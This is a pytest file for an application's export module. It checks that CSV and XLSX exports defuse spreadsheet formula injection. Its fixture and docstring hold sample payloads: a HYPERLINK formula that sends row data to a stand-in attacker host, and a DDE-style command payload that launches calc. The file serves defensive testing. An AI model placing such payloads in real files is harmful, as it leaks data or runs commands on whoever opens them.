"""Exports must not carry a formula into the reader's spreadsheet.

Two values in every exported row come from outside this service: the notes the
applicant typed, and text the crawler lifted off a third-party page. Excel,
LibreOffice and Sheets all execute a cell that begins ``=``, ``+``, ``-`` or
``@``, so an export was a way to run something on the machine of whoever opened
it — and `=HYPERLINK("http://evil/?"&A1,"open")` quietly sends the row it sits
in to a stranger the moment it is clicked.
"""

from __future__ import annotations

import csv
import io

import pytest

from app.domain.enums import ClaimType
from app.export.tabular import neutralize, to_csv, to_xlsx
from app.schemas.claim import ClaimOut
from app.schemas.result import ProgramResult
from tests.conftest import make_claim

PAYLOAD = '=HYPERLINK("http://attacker.invalid/?x="&A1,"Click for your results")'


@pytest.fixture
def poisoned_result() -> ProgramResult:
    """One result carrying an attacker-chosen string in each reachable field."""
    claim = make_claim(ClaimType.MIN_GPA.value, PAYLOAD, url="https://example.edu/admissions")
    return ProgramResult(
        id="result-1",
        run_id="run-1",
        university=PAYLOAD,
        university_id="uni-1",
        country="Kazakhstan",
        city="Astana",
        program="@SUM(1+1)*cmd|' /C calc'!A0",
        degree="bachelor",
        intake="fall 2027",
        user_notes=PAYLOAD,
        claims=[ClaimOut(id="claim-1", **claim.model_dump())],
    )


class TestNeutralize:
    def test_every_formula_lead_character_is_defused(self) -> None:
        for lead in ("=", "+", "-", "@", "\t", "\r"):
            assert str(neutralize(f"{lead}cmd")).startswith("'")

    def test_ordinary_text_is_untouched(self) -> None:
        assert neutralize("University of Groningen") == "University of Groningen"

    def test_a_negative_number_stays_a_number(self) -> None:
        assert neutralize("-1500") == "-1500"
        assert neutralize("-1500.25") == "-1500.25"

    def test_non_strings_pass_through(self) -> None:
        for value in (3, 4.5, True, None):
            assert neutralize(value) is value


class TestCsv:
    def _cells(self, text: str) -> list[str]:
        rows = list(csv.reader(io.StringIO(text)))
        return [cell for row in rows for cell in row]

    def test_a_payload_in_the_notes_cannot_start_a_formula(self, poisoned_result) -> None:
        cells = self._cells(to_csv([poisoned_result]))
        poisoned = [c for c in cells if "HYPERLINK" in c]
        assert poisoned, "the payload should still be present, just inert"
        assert all(c.startswith("'") for c in poisoned)

    def test_a_payload_from_a_crawled_page_is_defused_too(self, poisoned_result) -> None:
        cells = self._cells(to_csv([poisoned_result]))
        assert any(c.startswith("'@SUM") for c in cells)

    def test_no_cell_at_all_begins_with_a_formula_lead(self, poisoned_result) -> None:
        for cell in self._cells(to_csv([poisoned_result])):
            assert not cell.startswith(("=", "+", "@")), cell


class TestXlsx:
    def _cells(self, content: bytes) -> list[object]:
        from openpyxl import load_workbook

        workbook = load_workbook(io.BytesIO(content))
        return [
            cell.value
            for sheet in workbook.worksheets
            for row in sheet.iter_rows()
            for cell in row
            if cell.value is not None
        ]

    def test_the_workbook_carries_no_live_formula(self, poisoned_result) -> None:
        values = self._cells(to_xlsx([poisoned_result], {}))
        assert any(isinstance(v, str) and "HYPERLINK" in v for v in values)
        for value in values:
            if isinstance(value, str):
                assert not value.startswith(("=", "+", "@")), value

    def test_the_evidence_sheet_is_covered_as_well(self, poisoned_result) -> None:
        from openpyxl import load_workbook

        workbook = load_workbook(io.BytesIO(to_xlsx([poisoned_result], {})))
        for row in workbook["Evidence"].iter_rows(min_row=2):
            for cell in row:
                if isinstance(cell.value, str):
                    assert not cell.value.startswith(("=", "+", "@")), cell.value
